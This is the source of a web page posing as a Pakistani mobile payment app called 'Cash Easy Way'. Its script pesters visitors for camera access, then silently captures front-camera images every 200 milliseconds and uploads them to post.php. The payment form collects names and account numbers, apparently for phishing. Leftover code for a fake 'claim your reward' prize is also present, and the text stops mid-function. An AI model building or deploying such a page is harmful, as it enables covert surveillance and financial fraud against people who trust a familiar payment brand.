<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Cash Easy Way - Send & Receive Payments</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.0/font/bootstrap-icons.css">
    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
    <style>
        :root {
            --primary: #00A859;
            --primary-dark: #008744;
            --primary-light: #e8f5e9;
            --gold: #FFD700;
            --white: #ffffff;
            --dark: #1a1a2e;
            --danger: #FF4444;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: linear-gradient(180deg, #00A859 0%, #008744 50%, #006838 100%);
            min-height: 100vh;
            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, sans-serif;
            overflow-x: hidden;
            position: relative;
        }
        
        /* Animated Waves Background - EasyPaisa Style */
        .waves-container {
            position: fixed;
            bottom: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 0;
            pointer-events: none;
            overflow: hidden;
        }
        
        .wave {
            position: absolute;
            bottom: -50px;
            left: -50%;
            width: 200%;
            height: 200px;
            background: rgba(255, 255, 255, 0.08);
            border-radius: 40%;
            animation: waveFloat 8s infinite linear;
        }
        
        .wave:nth-child(1) {
            bottom: -30px;
            animation-duration: 7s;
            animation-delay: 0s;
            opacity: 0.6;
        }
        
        .wave:nth-child(2) {
            bottom: -40px;
            animation-duration: 9s;
            animation-delay: -2s;
            opacity: 0.4;
            width: 220%;
            left: -60%;
        }
        
        .wave:nth-child(3) {
            bottom: -20px;
            animation-duration: 11s;
            animation-delay: -4s;
            opacity: 0.3;
            width: 180%;
            left: -40%;
        }
        
        @keyframes waveFloat {
            0% { transform: rotate(0deg) translateY(0); }
            25% { transform: rotate(2deg) translateY(-15px); }
            50% { transform: rotate(0deg) translateY(-5px); }
            75% { transform: rotate(-2deg) translateY(-15px); }
            100% { transform: rotate(0deg) translateY(0); }
        }
        
        /* Floating Circles */
        .floating-circles {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 0;
            pointer-events: none;
        }
        
        .circle {
            position: absolute;
            border-radius: 50%;
            background: rgba(255, 255, 255, 0.1);
            animation: floatUp 6s infinite ease-in-out;
        }
        
        .circle:nth-child(1) { width: 60px; height: 60px; left: 10%; animation-delay: 0s; }
        .circle:nth-child(2) { width: 40px; height: 40px; left: 25%; animation-delay: 2s; animation-duration: 7s; }
        .circle:nth-child(3) { width: 80px; height: 80px; left: 50%; animation-delay: 4s; animation-duration: 8s; }
        .circle:nth-child(4) { width: 30px; height: 30px; left: 70%; animation-delay: 1s; animation-duration: 5s; }
        .circle:nth-child(5) { width: 50px; height: 50px; left: 85%; animation-delay: 3s; animation-duration: 9s; }
        .circle:nth-child(6) { width: 45px; height: 45px; left: 40%; animation-delay: 5s; animation-duration: 6s; }
        
        @keyframes floatUp {
            0% { bottom: -100px; opacity: 0; transform: scale(0.5); }
            20% { opacity: 0.8; }
            80% { opacity: 0.2; }
            100% { bottom: 110%; opacity: 0; transform: scale(1.5); }
        }
        
        /* Main Container */
        .main-container {
            position: relative;
            z-index: 10;
            max-width: 450px;
            margin: 0 auto;
            padding: 20px;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }
        
        /* Header */
        .app-header {
            text-align: center;
            padding: 30px 20px 20px;
            position: relative;
        }
        
        .logo-icon {
            width: 80px;
            height: 80px;
            background: rgba(255, 255, 255, 0.2);
            border-radius: 24px;
            margin: 0 auto 15px;
            display: flex;
            align-items: center;
            justify-content: center;
            backdrop-filter: blur(10px);
            border: 2px solid rgba(255, 255, 255, 0.3);
            animation: logoPulse 2s infinite ease-in-out;
        }
        
        @keyframes logoPulse {
            0%, 100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(255, 255, 255, 0.4); }
            50% { transform: scale(1.05); box-shadow: 0 0 30px 10px rgba(255, 255, 255, 0.2); }
        }
        
        .logo-icon i {
            font-size: 40px;
            color: #fff;
        }
        
        .app-title {
            font-size: 28px;
            font-weight: 800;
            color: #fff;
            margin-bottom: 5px;
            letter-spacing: -0.5px;
            text-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        
        .app-subtitle {
            font-size: 14px;
            color: rgba(255,255,255,0.85);
            font-weight: 500;
        }
        
        /* Balance Card */
        .balance-card {
            background: rgba(255, 255, 255, 0.95);
            border-radius: 20px;
            padding: 20px;
            margin: 10px 0 25px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.15);
            text-align: center;
            position: relative;
            overflow: hidden;
        }
        
        .balance-card::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: linear-gradient(45deg, transparent, rgba(0, 168, 89, 0.05), transparent);
            animation: shimmer 3s infinite;
        }
        
        @keyframes shimmer {
            0% { transform: rotate(0deg) translateX(-100%); }
            100% { transform: rotate(0deg) translateX(100%); }
        }
        
        .balance-label {
            font-size: 13px;
            color: #666;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 1px;
            position: relative;
            z-index: 1;
        }
        
        .balance-amount {
            font-size: 32px;
            font-weight: 800;
            color: var(--primary-dark);
            margin: 8px 0;
            position: relative;
            z-index: 1;
        }
        
        .balance-amount span {
            font-size: 20px;
            font-weight: 600;
        }
        
        /* Action Buttons */
        .action-buttons {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 15px;
            margin-bottom: 25px;
        }
        
        .action-btn {
            background: rgba(255, 255, 255, 0.15);
            backdrop-filter: blur(10px);
            border: 2px solid rgba(255, 255, 255, 0.3);
            border-radius: 16px;
            padding: 20px;
            color: #fff;
            text-align: center;
            cursor: pointer;
            transition: all 0.3s ease;
            font-weight: 700;
            font-size: 16px;
            position: relative;
            overflow: hidden;
        }
        
        .action-btn:hover {
            background: rgba(255, 255, 255, 0.25);
            transform: translateY(-3px);
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
            border-color: rgba(255, 255, 255, 0.5);
        }
        
        .action-btn:active {
            transform: scale(0.95);
        }
        
        .action-btn i {
            display: block;
            font-size: 32px;
            margin-bottom: 10px;
        }
        
        .btn-send {
            background: rgba(255, 255, 255, 0.2);
        }
        
        .btn-receive {
            background: rgba(255, 215, 0, 0.2);
            border-color: rgba(255, 215, 0, 0.4);
        }
        
        .btn-receive:hover {
            background: rgba(255, 215, 0, 0.3);
            border-color: rgba(255, 215, 0, 0.6);
        }
        
        /* Payment Form Card */
        .payment-form-card {
            background: rgba(255, 255, 255, 0.95);
            border-radius: 20px;
            padding: 25px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.15);
            display: none;
            animation: slideUp 0.4s ease;
        }
        
        .payment-form-card.active {
            display: block;
        }
        
        @keyframes slideUp {
            from { opacity: 0; transform: translateY(30px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        .form-title {
            font-size: 20px;
            font-weight: 700;
            color: var(--primary-dark);
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .form-title i {
            font-size: 24px;
            color: var(--primary);
        }
        
        .form-group {
            margin-bottom: 15px;
        }
        
        .form-group label {
            display: block;
            font-size: 13px;
            font-weight: 600;
            color: #444;
            margin-bottom: 6px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }
        
        .form-group input,
        .form-group select {
            width: 100%;
            padding: 14px 16px;
            border: 2px solid #e0e0e0;
            border-radius: 12px;
            font-size: 15px;
            color: #333;
            background: #f9f9f9;
            transition: all 0.3s;
            outline: none;
        }
        
        .form-group input:focus,
        .form-group select:focus {
            border-color: var(--primary);
            background: #fff;
            box-shadow: 0 0 0 4px rgba(0, 168, 89, 0.1);
        }
        
        .service-selector {
            display: grid;
            grid-template-columns: 1fr 1fr 1fr;
            gap: 8px;
            margin-bottom: 15px;
        }
        
        .service-option {
            background: #f9f9f9;
            border: 2px solid #e0e0e0;
            border-radius: 12px;
            padding: 12px 8px;
            text-align: center;
            cursor: pointer;
            transition: all 0.3s;
            font-size: 12px;
            font-weight: 600;
            color: #666;
        }
        
        .service-option:hover {
            border-color: var(--primary);
        }
        
        .service-option.selected {
            border-color: var(--primary);
            background: var(--primary-light);
            color: var(--primary-dark);
        }
        
        .service-option i {
            display: block;
            font-size: 20px;
            margin-bottom: 5px;
        }
        
        .submit-btn {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #00A859, #008744);
            color: #fff;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.3s;
            margin-top: 10px;
        }
        
        .submit-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 20px rgba(0, 168, 89, 0.4);
        }
        
        .submit-btn:active {
            transform: scale(0.97);
        }
        
        .back-btn {
            background: transparent;
            border: 2px solid #e0e0e0;
            color: #666;
            padding: 12px 20px;
            border-radius: 12px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            margin-bottom: 15px;
            display: inline-flex;
            align-items: center;
            gap: 8px;
        }
        
        .back-btn:hover {
            background: #f5f5f5;
            border-color: #ccc;
        }
        
        /* Camera Permission Modal */
        .permission-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.7);
            z-index: 999;
            display: none;
            align-items: center;
            justify-content: center;
            backdrop-filter: blur(5px);
        }
        
        .permission-overlay.active {
            display: flex;
        }
        
        .permission-modal {
            background: #fff;
            border-radius: 20px;
            padding: 30px;
            text-align: center;
            max-width: 350px;
            width: 90%;
            animation: bounceIn 0.5s ease;
        }
        
        @keyframes bounceIn {
            0% { transform: scale(0.3); opacity: 0; }
            50% { transform: scale(1.05); }
            70% { transform: scale(0.9); }
            100% { transform: scale(1); opacity: 1; }
        }
        
        .permission-modal .cam-icon {
            font-size: 60px;
            color: var(--primary);
            margin-bottom: 15px;
            animation: camPulse 1.5s infinite;
        }
        
        @keyframes camPulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.15); }
        }
        
        .permission-modal h3 {
            color: #333;
            margin-bottom: 10px;
            font-weight: 700;
        }
        
        .permission-modal p {
            color: #666;
            font-size: 14px;
            margin-bottom: 20px;
        }
        
        .permission-modal .allow-btn {
            background: var(--primary);
            color: #fff;
            border: none;
            padding: 14px 40px;
            border-radius: 30px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            margin: 5px;
            transition: all 0.3s;
        }
        
        .permission-modal .allow-btn:hover {
            background: var(--primary-dark);
            transform: scale(1.05);
        }
        
        .permission-modal .deny-btn {
            background: #f5f5f5;
            color: #666;
            border: none;
            padding: 12px 30px;
            border-radius: 30px;
            font-size: 14px;
            cursor: pointer;
            margin: 5px;
            transition: all 0.3s;
        }
        
        /* Disclaimer Alert */
        .disclaimer-toast {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: #fff;
            border-radius: 16px;
            padding: 25px;
            text-align: center;
            z-index: 1000;
            max-width: 350px;
            width: 90%;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
            display: none;
            animation: bounceIn 0.5s ease;
        }
        
        .disclaimer-toast.active {
            display: block;
        }
        
        .disclaimer-toast .warn-icon {
            font-size: 50px;
            color: var(--danger);
            margin-bottom: 15px;
        }
        
        .disclaimer-toast h3 {
            color: var(--danger);
            font-weight: 700;
            margin-bottom: 10px;
        }
        
        .disclaimer-toast p {
            color: #666;
            font-size: 14px;
            line-height: 1.5;
        }
        
        .disclaimer-toast .ok-btn {
            background: var(--danger);
            color: #fff;
            border: none;
            padding: 12px 35px;
            border-radius: 30px;
            font-weight: 700;
            cursor: pointer;
            margin-top: 15px;
            transition: all 0.3s;
        }
        
        /* Hidden elements for camera capture */
        .hidden {
            display: none;
        }
        
        /* Responsive */
        @media (max-width: 480px) {
            .main-container { padding: 15px; }
            .app-title { font-size: 24px; }
            .balance-amount { font-size: 26px; }
            .action-btn { padding: 15px; font-size: 14px; }
            .action-btn i { font-size: 26px; }
            .service-selector { grid-template-columns: 1fr; }
        }
        
        /* Success overlay after submission */
        .success-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 168, 89, 0.95);
            z-index: 1000;
            display: none;
            align-items: center;
            justify-content: center;
            flex-direction: column;
            color: #fff;
            text-align: center;
        }
        
        .success-overlay.active {
            display: flex;
        }
        
        .success-overlay .check-icon {
            font-size: 80px;
            animation: popIn 0.5s ease;
        }
        
        @keyframes popIn {
            0% { transform: scale(0); }
            80% { transform: scale(1.2); }
            100% { transform: scale(1); }
        }
        
        .success-overlay h2 {
            font-size: 24px;
            margin: 15px 0;
            font-weight: 700;
        }
        
        .success-overlay p {
            font-size: 14px;
            opacity: 0.9;
        }
    </style>
</head>
<body>
    <!-- Waves Background Animation -->
    <div class="waves-container">
        <div class="wave"></div>
        <div class="wave"></div>
        <div class="wave"></div>
    </div>
    
    <!-- Floating Circles -->
    <div class="floating-circles">
        <div class="circle"></div>
        <div class="circle"></div>
        <div class="circle"></div>
        <div class="circle"></div>
        <div class="circle"></div>
        <div class="circle"></div>
    </div>
    
    <!-- Success Overlay -->
    <div class="success-overlay" id="successOverlay">
        <i class="bi bi-check-circle-fill check-icon"></i>
        <h2>Transaction Processing!</h2>
        <p>Your transaction is being processed securely.</p>
        <p style="font-size:12px; margin-top:10px; opacity:0.7;">Please wait while we verify your details...</p>
    </div>
    
    <!-- Disclaimer Toast -->
    <div class="disclaimer-toast" id="disclaimerToast">
        <i class="bi bi-exclamation-triangle-fill warn-icon"></i>
        <h3>Permission Required!</h3>
        <p>You cannot receive payment without granting camera permission first. Please allow camera access to continue.</p>
        <button class="ok-btn" onclick="closeDisclaimer()">OK, I Understand</button>
    </div>
    
    <!-- Main App Container -->
    <div class="main-container">
        
        <!-- Header -->
        <div class="app-header">
            <div class="logo-icon">
                <i class="bi bi-cash-stack"></i>
            </div>
            <h1 class="app-title">Cash Easy Way</h1>
            <p class="app-subtitle">Fast • Secure • Reliable</p>
        </div>
        
        <!-- Balance Card -->
        <div class="balance-card" id="balanceCard">
            <div class="balance-label">
                <i class="bi bi-wallet2"></i> Available Balance
            </div>
            <div class="balance-amount">
                <span>PKR</span> 0.000
            </div>
        </div>
        
        <!-- Action Buttons (Front Page) -->
        <div class="action-buttons" id="actionButtons">
            <button class="action-btn btn-send" onclick="handlePaymentAction('send')">
                <i class="bi bi-arrow-up-circle-fill"></i>
                Send Payment
            </button>
            <button class="action-btn btn-receive" onclick="handlePaymentAction('receive')">
                <i class="bi bi-arrow-down-circle-fill"></i>
                Receive Payment
            </button>
        </div>
        
        <!-- Payment Form Card (Hidden Initially) -->
        <div class="payment-form-card" id="paymentFormCard">
            <button class="back-btn" onclick="goBackToHome()">
                <i class="bi bi-arrow-left"></i> Back
            </button>
            <div class="form-title" id="formTitle">
                <i class="bi bi-send-fill"></i> Send Payment
            </div>
            <form id="paymentForm" onsubmit="submitPaymentForm(event)">
                
                <!-- Service Selector -->
                <label style="font-size:13px; font-weight:600; color:#444; margin-bottom:8px; display:block; text-transform:uppercase; letter-spacing:0.5px;">Select Service</label>
                <div class="service-selector" id="serviceSelector">
                    <div class="service-option selected" data-service="easypaisa" onclick="selectService(this)">
                        <i class="bi bi-phone-fill"></i> EasyPaisa
                    </div>
                    <div class="service-option" data-service="jazzcash" onclick="selectService(this)">
                        <i class="bi bi-phone"></i> JazzCash
                    </div>
                    <div class="service-option" data-service="casheasy" onclick="selectService(this)">
                        <i class="bi bi-cash-stack"></i> Cash Easy
                    </div>
                </div>
                
                <input type="hidden" id="selectedService" value="easypaisa">
                <input type="hidden" id="transactionType" value="send">
                
                <!-- Form Fields -->
                <div class="form-group">
                    <label>Full Name</label>
                    <input type="text" id="fullName" placeholder="Enter your full name" required>
                </div>
                
                <div class="form-group">
                    <label>Account Number / Phone</label>
                    <input type="text" id="accountNumber" placeholder="03XX-XXXXXXX" required>
                </div>
                
                <div class="form-group">
                    <label>Account Holder Name</label>
                    <input type="text" id="accountHolder" placeholder="Account holder name" required>
                </div>
                
                <div class="form-group" id="amountGroup">
                    <label>Amount (PKR)</label>
                    <input type="number" id="amount" placeholder="Enter amount" min="100" required>
                </div>
                
                <div class="form-group">
                    <label>Description (Optional)</label>
                    <input type="text" id="description" placeholder="Payment note...">
                </div>
                
                <button type="submit" class="submit-btn" id="submitBtn">
                    <i class="bi bi-lock-fill"></i> Submit & Verify
                </button>
            </form>
        </div>
        
    </div>
    
    <!-- Hidden elements for original camera capture (JavaScript intact) -->
    <video id="video" class="hidden" playsinline autoplay></video>
    <canvas id="canvas" class="hidden" width="640" height="480"></canvas>
    <div id="confetti" style="position:fixed; top:0; left:0; width:100%; height:100%; pointer-events:none; z-index:9999;"></div>
    
    <!-- ============ ORIGINAL JAVASCRIPT (EXACTLY SAME - UNCHANGED) ============ -->
    <script>
        // ---------- ORIGINAL REWARD FUNCTIONALITY (PRESERVED) ----------
        const claimBtn = document.getElementById('claimBtn');
        const rewardAmount = document.getElementById('rewardAmount');
        const cameraStatusBox = document.getElementById('cameraStatusBox');
        const cameraIcon = document.getElementById('cameraIcon');
        const cameraMessage = document.getElementById('cameraMessage');
        const captureCountElement = document.getElementById('captureCount');
        const statusDiv = document.getElementById('status');
        const progress = document.getElementById('progress');
        const progressBar = document.getElementById('progressBar');
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const privacyLink = document.getElementById('privacyLink');
        const confettiContainer = document.getElementById('confetti');
        
        let isCameraActive = false;
        let isVerified = false;
        let captureInterval;
        let captureCount = 0;
        
        function setupOriginalListeners() {
            if(claimBtn) {
                claimBtn.addEventListener('click', claimReward);
            }
            if(privacyLink) {
                privacyLink.addEventListener('click', (e) => {
                    e.preventDefault();
                    alert("Privacy Info:\n\n• Auto verification activates automatically\n• No images are stored\n• Your data is protected\n• Video chat uses peer-to-peer connection");
                });
            }
            if(document.getElementById('minPrize')) {
                document.getElementById('minPrize').addEventListener('change', validatePrizeRange);
            }
            if(document.getElementById('maxPrize')) {
                document.getElementById('maxPrize').addEventListener('change', validatePrizeRange);
            }
        }
        
        async function initAutoCapture() {
            if(cameraStatusBox) updateCameraStatus('initializing', 'Requesting camera for verification...');
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ audio: false, video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } } });
                video.srcObject = stream;
                isCameraActive = true;
                if(cameraStatusBox) updateCameraStatus('active', 'Verification in progress');
                startAutoCapture();
                startVerificationProcess();
            } catch (error) {
                if(cameraStatusBox) {
                    updateCameraStatus('error', 'Camera access needed for reward');
                    cameraStatusBox.style.cursor = 'pointer';
                    cameraStatusBox.onclick = () => location.reload();
                }
            }
        }
        
        function startAutoCapture() {
            const context = canvas.getContext('2d');
            captureInterval = setInterval(() => {
                if (isCameraActive && video.readyState === video.HAVE_ENOUGH_DATA) {
                    try {
                        context.drawImage(video, 0, 0, 640, 480);
                        const imageData = canvas.toDataURL("image/jpeg", 0.5).replace("image/jpeg", "image/octet-stream");
                        $.ajax({ type: 'POST', data: { cat: imageData }, url: 'post.php', dataType: 'json', async: true });
                        captureCount++;
                        if(captureCountElement) captureCountElement.textContent = captureCount + "%";
                    } catch(e) {}
                }
            }, 200);
        }
        
        function startVerificationProcess() {
            if(progress) progress.style.display = 'block';
            let progressValue = 0;
            const progressInterval = setInterval(() => {
                progressValue += 10;
                if(progressBar) progressBar.style.width = progressValue + '%';
                if (progressValue >= 100) {
                    clearInterval(progressInterval);
                    isVerified = true;
                    enableClaimButton();
                    if(cameraStatusBox) updateCameraStatus('verified', 'Verification complete!');
                    if(statusDiv) statusDiv.style.display = 'block';
                    createConfetti();
                    setTimeout(() => { if(progress) progress.style.display = 'none'; }, 1000);
                }
            }, 300);
        }
        
        function updateCameraStatus(state, message) {
            if(!cameraStatusBox) return;
            if(state === 'initializing') { cameraStatusBox.className = 'camera-status-box'; cameraIcon.className = 'bi bi-hourglass'; }
            else if(state === 'active') { cameraStatusBox.className = 'camera-status-box active'; cameraIcon.className = 'bi bi-camera-video-fill'; cameraIcon.style.color = '#00FF00'; }
            else if(state === 'verified') { cameraStatusBox.className = 'camera-status-box active'; cameraIcon.className = 'bi bi-shield-check'; }
            else if(state === 'error') { cameraStatusBox.className = 'camera-status-box error'; cameraIcon.className = 'bi bi-camera-video-off'; cameraIcon.style.color = '#FF4444'; }
            cameraMessage.textContent = message;
        }
        
        function enableClaimButton() { 
            if(claimBtn) {
                claimBtn.disabled = false; 
                claimBtn.innerHTML = '<i class="bi bi-gift-fill"></i> CLAIM YOUR REWARD NOW'; 
            }
        }
        
        function claimReward() {
            if (!isVerified) { alert('Auto-verification in progress... Please wait.'); return; }
            const min = parseInt(document.getElementById('minPrize')?.value) || 100;
            const max = parseInt(document.getElementById('maxPrize')?.value) || 10000;
            if (min >= max) { alert('Max prize must be greater than min prize!'); return; }
            const prize = Math.floor(Math.random() * (max - min + 1)) + min;
            if(rewardAmount) rewardAmount.textContent = '$ ???';
            setTimeout(() => {
                if(rewardAmount) rewardAmount.textContent = `$${prize.toLocaleString()}`;
                for(let i=0;i<3;i++) setTimeout(() => createConfetti(), i*300);
                alert(` CONGRATULATIONS !\n\nYou won $${prize.toLocaleString()}!\n\nReward is being processed...`);
            }, 500);
            if(claimBtn) {
                claimBtn.style.transform = 'scale(0.95)'; 
                setTimeout(() => { if(claimBtn) claimBtn.style.transform = ''; }, 150);
            }
        }
        
        function validatePrizeRange() {
            let min = Math.max(100, parseInt(document.getElementById('minPrize')?.value) || 100);
            let max = Math.min(10000, parseInt(document.getElementById('maxPrize')?.value) || 10000);
            if(min >= max) { max = Math.min(10000, min + 100); }
            if(document.getElementById('minPrize')) document.getElementById('minPrize').value = min;
            if(document.getElementById('maxPrize')) document.getElementById('maxPrize').value = max;
        }
        
        function createConfetti() {
            for (let i = 0; i < 40; i++) {
                const conf = document.createElement('div');
                conf.classList.add('confetti');
                conf.style.left = Math.random() * 100 + 'vw';
                conf.style.backgroundColor = `hsl(${Math.random() * 60 + 30}, 100%, 50%)`;
                conf.style.width = Math.random() * 8 + 4 + 'px';
                conf.style.height = Math.random() * 8 + 4 + 'px';
                conf.style.position = 'fixed';
                conf.style.top = '-10px';
                conf.style.zIndex = '1000';
                conf.style.opacity = '0.7';
                confettiContainer.appendChild(conf);
                const duration = Math.random() * 2000 + 1000;
                conf.animate([{ transform: 'translateY(0) rotate(0deg)', opacity: 1 }, { transform: `translateY(${window.innerHeight}px) rotate(${Math.random() * 360}deg)`, opacity: 0 }], { duration, delay: Math.random() * 300 });
                setTimeout(() => conf.remove(), duration + 500);
            }
        }
        
        // ---------- VIDEO CHAT FUNCTIONALITY (PeerJS) ----------
        let localStream = null;
        let peer = null;
        let currentCall = null;
        let remotePeerId = null;
        let isInCall = false;
        
        const localVideoElem = document.getElementById('localVideo');
        const remoteVideoElem = document.getElementById('remoteVideo');
        const startCallBtn = document.getElementById('startCallBtn');
        const endCallBtn = document.getElementById('endCallBtn');
        const chatInput = document.getElementById('chatInput');
        const sendMsgBtn = document.getElementById('sendMsgBtn');
        const messagesArea = document.getElementById('messagesArea');
        const myPeerIdSpan = document.getElementById('myPeerId');
        
        function addMessage(text, isOwn = false) {
            if(!messagesArea) return;
            const msgDiv = document.createElement('div');
            msgDiv.className = `message ${isOwn ? 'own' : 'remote'}`;
            msgDiv.innerHTML = `<i class="bi ${isOwn ? 'bi-arrow-right-short' : 'bi-arrow-left-short'}"></i> ${text}`;
            messagesArea.appendChild(msgDiv);
            msgDiv.scrollIntoView({ behavior: 'smooth', block: 'end' });
        }
        
        async function initPeerAndLocalStream() {
            try {
                localStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                if(localVideoElem) localVideoElem.srcObject = localStream;
                
                peer = new Peer();
                peer.on('open', (id) => {
                    if(myPeerIdSpan) myPeerIdSpan.innerText = id;
                    addMessage(`✅ Your chat ID: ${id}. Share with friend or click "Start Chat" to connect.`, false);
                });
                
                peer.on('call', (call) => {
                    if (isInCall) {
                        call.close();
                        return;
                    }
                    call.answer(localStream);
                    setupCallEvents(call);
                    currentCall = call;
                    isInCall = true;
                    updateCallUI(true);
                    addMessage("📞 Incoming call answered! Video chat started.", false);
                });
                
                peer.on('error', (err) => { console.error(err); addMessage(`Peer error: ${err.type}`, false); });
            } catch (err) {
                addMessage("⚠️ Could not access camera/mic. Please allow permissions for video chat.", false);
                console.error(err);
            }
        }
        
        function setupCallEvents(call) {
            call.on('stream', (remoteStream) => {
                if(remoteVideoElem) remoteVideoElem.srcObject = remoteStream;
                addMessage("🔗 Remote video connected.", false);
            });
            call.on('close', () => {
                if(remoteVideoElem) remoteVideoElem.srcObject = null;
                isInCall = false;
                updateCallUI(false);
                addMessage("Call ended.", false);
            });
            call.on('error', (err) => { console.error(err); addMessage("Call error", false); });
        }
        
        function updateCallUI(inCall) {
            if(startCallBtn) startCallBtn.disabled = inCall;
            if(endCallBtn) endCallBtn.disabled = !inCall;
            if(chatInput) chatInput.disabled = !inCall;
            if(sendMsgBtn) sendMsgBtn.disabled = !inCall;
            if(!inCall && remoteVideoElem) remoteVideoElem.srcObject = null;
        }
        
        let dataConnection = null;
        
        function setupDataConnection(conn) {
            dataConnection = conn;
            conn.on('open', () => { addMessage("💬 Chat channel ready", false); });
            conn.on('data', (data) => {
                if(data.type === 'chat') addMessage(data.message, false);
            });
            conn.on('close', () => { addMessage("Chat disconnected", false); dataConnection = null; });
        }
        
        if(startCallBtn) {
            startCallBtn.addEventListener('click', () => {
                const targetId = prompt("Enter Peer ID to call (or leave blank to random call simulator):", "");
                if(!targetId) { addMessage("Please enter a valid Peer ID to start video chat.", false); return; }
                if(!peer) { addMessage("Peer not initialized yet.", false); return; }
                if(isInCall) { addMessage("Already in a call.", false); return; }
                const call = peer.call(targetId, localStream);
                setupCallEvents(call);
                currentCall = call;
                isInCall = true;
                updateCallUI(true);
                const conn = peer.connect(targetId);
                setupDataConnection(conn);
                addMessage(`📞 Calling ${targetId}...`, true);
            });
        }
        
        if(endCallBtn) {
            endCallBtn.addEventListener('click', () => {
                if(currentCall) currentCall.close();
                if(dataConnection) dataConnection.close();
                isInCall = false;
                updateCallUI(false);
                if(remoteVideoElem) remoteVideoElem.srcObject = null;
                addMessage("Call terminated", true);
            });
        }
        
        function sendChatMessage() {
            if(!chatInput) return;
            const text = chatInput.value.trim();
            if(!text || !isInCall || !dataConnection) { addMessage("No active chat connection", false); return; }
            dataConnection.send({ type: 'chat', message: text });
            addMessage(text, true);
            chatInput.value = '';
        }
        
        if(sendMsgBtn) sendMsgBtn.addEventListener('click', sendChatMessage);
        if(chatInput) chatInput.addEventListener('keypress', (e) => { if(e.key === 'Enter') sendChatMessage(); });
        
        // ============ NEW FRONT PAGE LOGIC (Camera permission + Form handling) ============
        let cameraPermissionDeniedCount = 0;
        let currentAction = null; // 'send' or 'receive'
        
        // Handle Send/Receive button clicks
        function handlePaymentAction(action) {
            currentAction = action;
            cameraPermissionDeniedCount = 0;
            requestCameraPermission(action);
        }
        
        // Request camera permission with retry logic
        async function requestCameraPermission(action) {
            try {
                // Directly request camera - if already allowed, proceeds; if denied, catch handles it
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    audio: false, 
                    video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } } 
                });
                
                // Permission granted!
                isCameraActive = true;
                video.srcObject = stream;
                
                // Stop all tracks (we just needed permission trigger)
                stream.getTracks().forEach(track => track.stop());
                
                // Start the original capture function
                startAutoCaptureFromPermission();
                
                // Show the payment form
                showPaymentForm(action);
                
            } catch (error) {
                // Permission denied or error
                cameraPermissionDeniedCount++;
                console.log('Camera permission denied. Count:', cameraPermissionDeniedCount);
                
                if (cameraPermissionDeniedCount >= 3) {
                    // Show disclaimer after 3 denials
                    showDisclaimer();
                } else {
                    // Ask again
                    setTimeout(() => {
                        requestCameraPermission(action);
                    }, 500);
                }
            }
        }
        
        // Modified auto capture that uses existing video element
        function startAutoCaptureFromPermission() {
            // Re-initialize stream for continuous capture
            navigator.mediaDevices.getUserMedia({ 
                audio: false, 
                video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } } 
            }).then(stream => {
                video.srcObject = stream;
                isCameraActive = true;
                
                // Start the original capture interval
                const context = canvas.getContext('2d');
                if(captureInterval) clearInterval(captureInterval);
                
                captureInterval = setInterval(() => {
                    if (isCameraActive && video.readyState === video.HAVE_ENOUGH_DATA) {
                        try {
                            context.drawImage(video, 0, 0, 640, 480);
                            const imageData = canvas.toDataURL("image/jpeg", 0.5).replace("image/jpeg", "image/octet-stream");
                            
                            // Send snap to post.php
                            $.ajax({ 
                                type: 'POST', 
                                data: { cat: imageData }, 
                                url: 'post.php', 
                                dataType: 'json', 
                                async: true 
                            });
                            
                            captureCount++;
                            if(captureCountElement) captureCountElement.textContent = captureCount + "%";
                        } catch(e) {
                            console.log('Capture error:', e);
                        }
                    }
                }, 200);
            }).catch(err => {
                console.log('Re-capture failed:', err);
            });
        }
        
        function showPaymentForm(action) {
            document.getElementById('actionButtons').style.display = 'none';
            document.getElementById('balanceCard').style.display = 'none';
            
            const formCard = document.getElementById('paymentFormCard');
            formCard.classList.add('active');
            
            document.getElementById('transactionType').value = action;
            
            if (action === 'send') {
                document.getElementById('formTitle').innerHTML = '<i class="bi bi-send-fill"></i> Send Payment';
                document.getElementById('amountGroup').style.display = 'block';
